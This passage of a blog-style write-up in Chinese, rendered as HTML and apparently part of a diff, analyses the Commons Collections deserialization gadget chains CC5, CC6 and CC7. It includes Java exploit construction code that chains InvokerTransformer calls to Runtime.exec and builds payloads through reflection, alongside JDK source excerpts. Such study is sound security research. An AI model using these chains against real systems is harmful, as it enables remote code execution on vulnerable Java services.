class="line"></span><br><span class="line">      <span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">      <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>);</span><br><span class="line">      queue.add(<span class="number">1</span>);</span><br><span class="line">      queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      setFieldValue(queue, <span class="string">&quot;comparator&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer));</span><br></pre></td></tr></table></figure>
+
+<h4 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h4><h5 id="利用链分析-1"><a href="#利用链分析-1" class="headerlink" title="利用链分析"></a>利用链分析</h5><p>LazyMap以及往后的调用链构造均和CommonsCollections1相同，不重复；<br>(即需要调用LazyMap.get())</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">			String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">			<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">			Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">			<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure>
+
+<p>差别在于后续的构造，Gadget Chain也比较简单：BadAttributeValueExpException.readObject()-&gt;TiedMapEntry.toString()-&gt;LazyMap.get()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BadAttributeValueExpException.java</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BadAttributeValueExpException</span> <span class="params">(Object val)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val == <span class="literal">null</span> ? <span class="literal">null</span> : val.toString();</span><br><span class="line">    &#125;    </span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// TiedMapEntry.java</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="built_in">this</span>.getValue();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用链构造-4"><a href="#利用链构造-4" class="headerlink" title="利用链构造"></a>利用链构造</h5><p>实际运行发现BadAttributeValueExpException在jdk1.6没有readObject，草，切回1.8_102可以<br>然后还有个问题是跟debug走不到BadAttributeValueExpException.readObject()，不知道为啥<br>（重新跑了下又发现了问题，好像触发是在构造过程中，而不是在反序列化过程中）<br>如下构造可以了，这里如果直接new BadAttributeValueExpException(entry)会触发构造函数中的toString()从而提前触发命令执行，因此采用反射进行构造</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">setFieldValue(val, <span class="string">&quot;val&quot;</span>, entry);</span><br></pre></td></tr></table></figure>
+
+<h4 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h4><h5 id="知识点整理-2"><a href="#知识点整理-2" class="headerlink" title="知识点整理"></a>知识点整理</h5><p><strong>1. HashMap</strong></p>
+<p>HashMap实现了Map接口，该接口的作用主要是为客户提供三种方式的数据显示：只查看keys列表，只查看values列表，或以key-value形式成对查看。<br>HashMap拥有一个内部静态类Node用于存储键值对，并且可以以链的形式添加多个元素<br>这里Node继承了Map.Entry，Map.Entry是Map声明的一个内部接口，此接口为泛型，定义为Entry&lt;K,V&gt;。它表示Map中的一个实体（一个key-value对）。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashMap</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">AbstractMap</span>&lt;K,V&gt;</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The table, initialized on first use, and resized as</span></span><br><span class="line"><span class="comment">     * necessary. When allocated, length is always a power of two.</span></span><br><span class="line"><span class="comment">     * (We also tolerate length zero in some operations to allow</span></span><br><span class="line"><span class="comment">     * bootstrapping mechanics that are currently not needed.)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">transient</span> Node&lt;K,V&gt;[] table;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Node</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry&lt;K,V&gt; &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> hash;</span><br><span class="line">        <span class="keyword">final</span> K key;</span><br><span class="line">        V value;</span><br><span class="line">        Node&lt;K,V&gt; next;</span><br><span class="line"></span><br><span class="line">        Node(<span class="type">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class="line">            <span class="built_in">this</span>.hash = hash;</span><br><span class="line">            <span class="built_in">this</span>.key = key;</span><br><span class="line">            <span class="built_in">this</span>.value = value;</span><br><span class="line">            <span class="built_in">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> K <span class="title function_">getKey</span><span class="params">()</span>        &#123; <span class="keyword">return</span> key; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> V <span class="title function_">getValue</span><span class="params">()</span>      &#123; <span class="keyword">return</span> value; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">toString</span><span class="params">()</span> &#123; <span class="keyword">return</span> key + <span class="string">&quot;=&quot;</span> + value; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> V <span class="title function_">setValue</span><span class="params">(V newValue)</span> &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> value;</span><br><span class="line">            value = newValue;</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Map.Entry) &#123;</span><br><span class="line">                Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;)o;</span><br><span class="line">                <span class="keyword">if</span> (Objects.equals(key, e.getKey()) &amp;&amp;</span><br><span class="line">                    Objects.equals(value, e.getValue()))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. HashSet</strong></p>
+<p>HashSet 底层是基于HashMap实现的。在HashSet中不允许出现重复的元素，HashSet 的绝大部分方法都是通过调用 HashMap 的方法来实现的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashSet</span>&lt;E&gt;</span><br><span class="line">    <span class="keyword">extends</span> <span class="title class_">AbstractSet</span>&lt;E&gt;</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">Set</span>&lt;E&gt;, Cloneable, java.io.Serializable</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">5024744406713321676L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> HashMap&lt;E,Object&gt; map;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Dummy value to associate with an Object in the backing Map</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">PRESENT</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructs a new, empty set; the backing &lt;tt&gt;HashMap&lt;/tt&gt; instance has</span></span><br><span class="line"><span class="comment">     * default initial capacity (16) and load factor (0.75).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HashSet</span><span class="params">()</span> &#123;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>HashSet要重写hashCode和equals方法，方便比较对象的值是否相等。<br>当调用HashSet的add方法时，实际上是向HashMap中增加了一行(key-value对)</p>
+<h5 id="利用链构造-5"><a href="#利用链构造-5" class="headerlink" title="利用链构造"></a>利用链构造</h5><p>LazyMap以及往后的调用链构造均和CommonsCollections1相同；<br>后续链构造这里参考ysoserial给出的Gadget Chain分析：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">       java.util.HashSet.readObject()</span><br><span class="line">           java.util.HashMap.put()</span><br><span class="line">           java.util.HashMap.hash()</span><br><span class="line">               org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">               org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                   org.apache.commons.collections.map.LazyMap.get()</span><br></pre></td></tr></table></figure>
+
+<p>这里利用TiedMapEntry.hashCode()，与链5中利用的TiedMapEntry.toString()进行区别（目标都是调getValue())：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="built_in">this</span>.getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后利用HashMap类的hash和put方法以及HashSet的readObject方法串起调用链，可以发现readObject会在末尾读取map内部元素后调用put将其压入map中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">       <span class="type">int</span> h;</span><br><span class="line">       <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">       <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">       <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">       s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Read capacity and verify non-negative.</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">       <span class="keyword">if</span> (capacity &lt; <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal capacity: &quot;</span> +</span><br><span class="line">                                            capacity);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Read load factor and verify positive and non NaN.</span></span><br><span class="line">       <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">       <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                            loadFactor);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Read size and verify non-negative.</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">       <span class="keyword">if</span> (size &lt; <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal size: &quot;</span> +</span><br><span class="line">                                            size);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Set the capacity according to the size and load factor ensuring that</span></span><br><span class="line">       <span class="comment">// the HashMap is at least 25% full but clamping to maximum capacity.</span></span><br><span class="line">       capacity = (<span class="type">int</span>) Math.min(size * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">               HashMap.MAXIMUM_CAPACITY);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Create backing HashMap</span></span><br><span class="line">       map = (((HashSet&lt;?&gt;)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">           <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">               <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">           map.put(e, PRESENT);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>构造时，采用多次反射的方式指定hashSet.map.table[1].key，将其置为构造好的TiedMapEntry即可<br>（这里array的类型都是Map内部的静态类Node，不太好直接声明）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line"><span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">hashSet.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> (HashMap) getFieldValue(hashSet, <span class="string">&quot;map&quot;</span>);</span><br><span class="line">Object[] array = (Object[]) getFieldValue(hashMap, <span class="string">&quot;table&quot;</span>);</span><br><span class="line">Map.<span class="type">Entry</span> <span class="variable">node</span> <span class="operator">=</span> (Map.Entry) array[<span class="number">1</span>];</span><br><span class="line">setFieldValue(node, <span class="string">&quot;key&quot;</span>, entry);</span><br></pre></td></tr></table></figure>
+
+<p>(其实有一个点还不太清楚，这个HashSet初始化的时候没有指定其元素类型，那是怎么处理的)（这个应该是泛型相关的知识</p>
+<h4 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h4><h5 id="利用链分析-2"><a href="#利用链分析-2" class="headerlink" title="利用链分析"></a><strong>利用链分析</strong></h5><p>最后一条链了，先看看ysoserial给的调用链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.util.Hashtable.readObject</span><br><span class="line">java.util.Hashtable.reconstitutionPut</span><br><span class="line">org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">java.util.AbstractMap.equals</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">java.lang.reflect.Method.invoke</span><br><span class="line">sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">java.lang.Runtime.exec</span><br></pre></td></tr></table></figure>
+
+<p>LazyMap.get以及之后和前面的链相同；</p>
+<p>之后的利用有点复杂，后面看看</p>
+<p>从Hashtable.readObject()开始跟，reconstitutionPut在最后的部分里<br>逻辑是把元素通过读取对象的形式还原出来，并通过reconstitutionPut进行元素对比加入到hashtable中</p>
+<p>reconstitutionPut中则计算key的哈希值，得到index后进行能否插入的检查，这里通过e.key.equals(key)来串起反序列化链<br>注意其触发时首先要触发e.hash &#x3D;&#x3D; hash<br>（感觉有点懵逼，怎么就到org.apache.commons.collections.map.AbstractMapDecorator.equals和java.util.AbstractMap.equals了）<br>（哦这里第一个是因为LazyMap extends AbstractMapDecorator，构造的时候也是把Key指定为LazyMap的）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">       <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">...</span><br><span class="line">      <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">      <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">          <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">              <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">          <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">              <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">          <span class="comment">// sync is eliminated for performance</span></span><br><span class="line">          reconstitutionPut(table, key, value);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">      <span 